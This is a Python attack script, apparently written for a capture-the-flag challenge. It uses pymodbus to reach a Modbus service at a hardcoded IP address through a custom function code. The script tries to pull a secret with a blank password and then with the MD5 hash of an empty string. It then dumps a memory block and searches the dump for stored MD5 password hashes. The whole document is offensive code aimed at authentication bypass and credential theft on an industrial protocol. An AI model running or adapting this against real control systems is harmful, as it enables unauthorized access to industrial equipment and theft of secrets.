from pymodbus.client import ModbusTcpClient
from pymodbus.pdu import ModbusRequest, ModbusResponse
import struct
from pymodbus.transaction import ModbusSocketFramer

HOST_IP = '154.57.164.70'
HOST_PORT = 32538
CUSTOM_FC = 0x64

class CustomRequest(ModbusRequest):
    function_code = CUSTOM_FC
    def __init__(self, data=None, **kwargs):
        super().__init__(**kwargs)
        self.data = data if data is not None else []
    def encode(self):
        return struct.pack('B' * len(self.data), *self.data)
    def decode(self, data): pass

class CustomResponse(ModbusResponse):
    function_code = CUSTOM_FC
    def __init__(self, data=None, **kwargs):
        super().__init__(**kwargs)
        self.data = data if data is not None else []
    def encode(self): pass
    def decode(self, data):
        self.data = struct.unpack('>' + 'B' * len(data), data)

def send_packet(client, data):
    req = CustomRequest(data=data)
    resp = client.execute(req)
    if resp.function_code < 0x80:
        return resp.data
    return None

client = ModbusTcpClient(HOST_IP, port=HOST_PORT, framer=ModbusSocketFramer)
client.framer.decoder.register(CustomResponse)

if not client.connect():
    print("[-] Connection failed"); exit()

print("[+] Connected!")

# --- Test 1: Call get_secret with no password (blank) ---
print("\n[*] Test 1: get_secret with empty password")
pkt = [0x00, 0x22]
resp = send_packet(client, pkt)
print(f"    Response: {resp}")

# --- Test 2: Call get_secret with a dummy password (16 zero bytes = MD5 of nothing?) ---
import hashlib
# MD5 of empty string
md5_empty = hashlib.md5(b'').digest()
print(f"\n[*] Test 2: get_secret with MD5('') = {md5_empty.hex()}")
pkt = [0x00, 0x22] + list(md5_empty)
resp = send_packet(client, pkt)
print(f"    Response: {resp}")

# --- Test 3: Read block 0 in smaller chunks to see full content ---
print("\n[*] Test 3: Full dump of block 0 (reading in 200-byte chunks)")
full_block0 = bytearray()
for offset in range(0, 1024, 200):
    addr = 0 * 1024 + offset
    addr_0 = (addr >> 16) & 0xFF
    addr_1 = (addr >> 8) & 0xFF
    addr_2 = addr & 0xFF
    length = min(200, 1024 - offset)
    pkt = [0x00, 0x20, addr_0, addr_1, addr_2, length]
    data = send_packet(client, pkt)
    if data:
        # Strip response header: [session][FC][status] = first 3 bytes
        chunk = bytes(data[3:3+length])
        full_block0 += chunk
        print(f"  offset {offset:4d}: {chunk.hex()}")

print(f"\n[*] Block 0 full hex ({len(full_block0)} bytes):")
print(full_block0.hex())

# Look for 16-byte sequences that look like MD5 (non-FF, non-00 runs)
print("\n[*] Searching for candidate MD5 hashes (16-byte non-null/non-FF runs):")
for i in range(len(full_block0) - 15):
    chunk = full_block0[i:i+16]
    if b'\xff' not in chunk and b'\x00' not in chunk:
        print(f"  offset {i}: {chunk.hex()}")

client.close()
